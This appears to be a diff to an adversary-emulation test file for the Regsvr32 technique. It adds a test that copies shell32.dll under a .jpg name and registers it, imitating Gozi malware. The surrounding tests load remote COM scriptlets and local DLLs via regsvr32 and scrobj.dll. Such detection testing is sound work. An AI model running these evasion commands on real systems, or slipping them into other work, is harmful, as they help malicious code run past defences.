@@ -25,6 +25,7 @@ atomic_tests:
     command: |
       regsvr32.exe /s /u /i:#{filename} scrobj.dll
     name: command_prompt
+
 - name: Regsvr32 remote COM scriptlet execution
   auto_generated_guid: c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36
   description: |
@@ -41,6 +42,7 @@ atomic_tests:
     command: |
       regsvr32.exe /s /u /i:#{url} scrobj.dll
     name: command_prompt
+
 - name: Regsvr32 local DLL execution
   auto_generated_guid: 08ffca73-9a3d-471a-aeb0-68b4aa3ab37b
   description: |
@@ -66,3 +68,30 @@ atomic_tests:
       IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
     name: command_prompt
 
+- name: Regsvr32 Registering Non DLL
+  description: |
+    Replicating observed Gozi maldoc behavior registering a dll with an altered extension
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    dll_file:
+      description: Path to renamed dll file to be registered
+      type: Path
+      default: '%temp%\shell32.jpg'
+  dependency_executor_name: command_prompt # (optional) The executor for the prereq commands, defaults to the same executor used by the attack commands
+  dependencies: # (optional)
+    - description: |
+        Test requires a renamed dll file
+      prereq_command: | 
+        if exist #{dll_file} ( exit 0 ) else ( exit 1 )
+      get_prereq_command: | # commands to meet this prerequisite or a message describing how to meet this prereq
+        copy "C:\Windows\System32\shell32.dll" "#{dll_file}"
+  executor:
+    name: command_prompt
+    elevation_required: false # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
+    command: | # these are the actaul attack commands, at least one command must be provided
+      regsvr32 /s #{dll_file}
+    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
+      regsvr32 /U /s #{dll_file}
